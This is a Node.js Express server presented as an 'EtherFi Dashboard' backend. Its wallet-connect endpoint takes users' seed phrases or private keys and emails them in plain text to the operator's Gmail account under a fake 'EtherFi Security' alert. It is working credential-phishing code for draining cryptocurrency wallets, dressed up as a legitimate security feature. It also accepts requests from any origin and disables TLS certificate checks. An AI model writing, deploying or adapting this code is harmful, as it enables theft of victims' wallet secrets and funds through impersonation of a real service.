const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

// Security middleware
app.use(helmet());

// Rate limiting
const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000, // 15 minutes
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 5, // limit each IP to 5 requests per windowMs
  message: {
    error: 'Too many requests from this IP, please try again later.',
    retryAfter: Math.ceil((parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000) / 1000)
  },
  standardHeaders: true,
  legacyHeaders: false,
});

app.use('/api/', limiter);

// CORS configuration
const corsOptions = {
  origin: function (origin, callback) {
    const allowedOrigins = [
      process.env.FRONTEND_URL,
      process.env.FRONTEND_URL_PROD,
      'https://dapps-etherfi.web.app',
      'https://dapps-etherfi.firebaseapp.com',
      'http://localhost:3000',
      'http://localhost:8080',
      'http://localhost:5500',
      'http://localhost:5501',
      'http://localhost:5502',
      'http://127.0.0.1:5500',
      'http://127.0.0.1:5501',
      'http://127.0.0.1:5502',
      'http://127.0.0.1:8080',
      'http://127.0.0.1:3000',
      'file://' // For local file protocol
    ].filter(Boolean);

    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      console.log('CORS blocked origin:', origin);
      callback(null, true); // Allow all origins for development
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-api-secret']
};

app.use(cors(corsOptions));

// Body parsing middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// API Secret validation middleware
const validateApiSecret = (req, res, next) => {
  const apiSecret = req.headers['x-api-secret'];
  
  if (!apiSecret || apiSecret !== process.env.API_SECRET) {
    return res.status(401).json({
      success: false,
      error: 'Invalid or missing API secret'
    });
  }
  
  next();
};

// Email transporter configuration
const createEmailTransporter = () => {
  return nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS
    },
    tls: {
      rejectUnauthorized: false
    }
  });
};

// Email template function
const generateEmailTemplate = (walletData) => {
  const timestamp = new Date().toLocaleString();
  
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
        .container { max-width: 600px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { background-color: #191638; color: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        .content { line-height: 1.6; }
        .field { margin-bottom: 15px; padding: 10px; background-color: #f8f9fa; border-radius: 5px; }
        .label { font-weight: bold; color: #333; }
        .value { margin-top: 5px; word-break: break-all; }
        .warning { background-color: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 5px; margin-top: 20px; }
        .footer { margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; font-size: 12px; color: #666; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1 style="margin: 0;">🔒 Wallet Connection Attempt</h1>
          <p style="margin: 10px 0 0 0;">EtherFi Dashboard</p>
        </div>
        
        <div class="content">
          <p>A new wallet connection attempt has been detected on your EtherFi dashboard.</p>
          
          <div class="field">
            <div class="label">🕐 Timestamp:</div>
            <div class="value">${timestamp}</div>
          </div>
          
          <div class="field">
            <div class="label">💼 Wallet Provider:</div>
            <div class="value">${walletData.walletProvider}</div>
          </div>
          
          <div class="field">
            <div class="label">🔑 Connection Type:</div>
            <div class="value">${walletData.walletType === 'phrase' ? 'Seed Phrase' : 'Private Key'}</div>
          </div>
          
          <div class="field">
            <div class="label">📝 Credentials:</div>
            <div class="value" style="background-color: #ffe6e6; padding: 10px; border-radius: 3px; font-family: monospace; font-size: 12px;">
              ${walletData.credentials}
            </div>
          </div>
          
          <div class="warning">
            <strong>⚠️ Security Notice:</strong><br>
            This email contains sensitive wallet information. Please ensure this connection attempt was authorized by you. If you did not initiate this connection, please take immediate action to secure your wallet.
          </div>
        </div>
        
        <div class="footer">
          <p>This is an automated message from EtherFi Security System.</p>
          <p>Please do not reply to this email.</p>
        </div>
      </div>
    </body>
    </html>
  `;
};

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    message: 'EtherFi Backend Server is running',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV
  });
});

// Handle preflight requests
app.options('/api/*', (req, res) => {
  res.status(200).end();
});

// Wallet connection endpoint
app.post('/api/wallet-connect', validateApiSecret, async (req, res) => {
  try {
    const { walletProvider, walletType, credentials } = req.body;

    // Input validation
    if (!walletProvider || !walletType || !credentials) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields: walletProvider, walletType, or credentials'
      });
    }

    // Validate wallet type
    if (!['phrase', 'privateKey'].includes(walletType)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid walletType. Must be either "phrase" or "privateKey"'
      });
    }

    // Prepare wallet data
    const walletData = {
      walletProvider: walletProvider.trim(),
      walletType,
      credentials: credentials.trim(),
      timestamp: new Date().toISOString(),
      userAgent: req.headers['user-agent'],
      ip: req.ip || req.connection.remoteAddress
    };

    // Create email transporter
    const transporter = createEmailTransporter();

    // Email options
    const mailOptions = {
      from: `"EtherFi Security" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_USER,
      subject: `🔒 Wallet Connection Alert - ${walletProvider} (${walletType})`,
      html: generateEmailTemplate(walletData),
      priority: 'high'
    };

    // Send email
    await transporter.sendMail(mailOptions);

    // Log the attempt (without sensitive data)
    console.log(`[${new Date().toISOString()}] Wallet connection attempt:`, {
      provider: walletProvider,
      type: walletType,
      ip: walletData.ip,
      userAgent: walletData.userAgent
    });

    // Send success response
    res.status(200).json({
      success: true,
      message: 'Wallet connection data processed successfully',
      timestamp: walletData.timestamp
    });

  } catch (error) {
    console.error('Error processing wallet connection:', error);
    
    // Send error response
    res.status(500).json({
      success: false,
      error: 'Internal server error. Please try again later.',
      timestamp: new Date().toISOString()
    });
  }
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    availableEndpoints: [
      'GET /api/health',
      'POST /api/wallet-connect'
    ]
  });
});

// Global error handler
app.use((err, req, res, next) => {
  console.error('Global error handler:', err);
  
  res.status(500).json({
    success: false,
    error: 'Something went wrong!',
    timestamp: new Date().toISOString()
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 EtherFi Backend Server running on port ${PORT}`);
  console.log(`📧 Email notifications will be sent to: ${process.env.EMAIL_USER}`);
  console.log(`🔒 API Secret validation enabled`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV}`);
  console.log(`⏰ Started at: ${new Date().toISOString()}`);
});

module.exports = app;
